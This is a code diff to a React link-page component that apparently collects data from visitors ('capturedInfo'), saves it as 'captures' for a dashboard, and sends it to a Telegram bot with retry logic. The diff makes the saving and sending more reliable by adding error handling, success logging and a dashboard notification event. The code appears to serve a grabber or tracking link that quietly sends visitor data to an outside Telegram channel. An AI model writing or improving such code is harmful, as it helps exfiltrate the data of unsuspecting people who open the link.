@@ -103,12 +103,33 @@ function LinkPageClient() {
 
         // Save to localStorage with error handling
         try {
-          const savedCaptures = localStorage.getItem('captures')
-          const captures = savedCaptures ? JSON.parse(savedCaptures) : []
+          // Get existing captures or initialize empty array
+          let captures = []
+          try {
+            const savedCaptures = localStorage.getItem('captures')
+            if (savedCaptures) {
+              captures = JSON.parse(savedCaptures)
+            }
+          } catch (error) {
+            console.error('Error reading from localStorage:', error)
+          }
+
+          // Add new capture
           captures.push(capturedInfo)
-          localStorage.setItem('captures', JSON.stringify(captures))
+
+          // Save back to localStorage
+          try {
+            localStorage.setItem('captures', JSON.stringify(captures))
+            console.log('Data saved to localStorage successfully')
+          } catch (error) {
+            console.error('Error saving to localStorage:', error)
+          }
+
+          // Dispatch event to notify dashboard
+          const event = new CustomEvent('newCapture', { detail: capturedInfo })
+          window.dispatchEvent(event)
         } catch (error) {
-          console.error('Error saving to localStorage:', error)
+          console.error('Error in save process:', error)
         }
 
         // Send to Telegram with retry logic
@@ -118,6 +139,7 @@ function LinkPageClient() {
         while (retryCount < maxRetries) {
           try {
             await sendTelegramMessage(BOT_TOKEN, CHAT_ID, capturedInfo)
+            console.log('Data sent to Telegram successfully')
             break
           } catch (error) {
             console.error(`Error sending to Telegram (attempt ${retryCount + 1}):`, error)
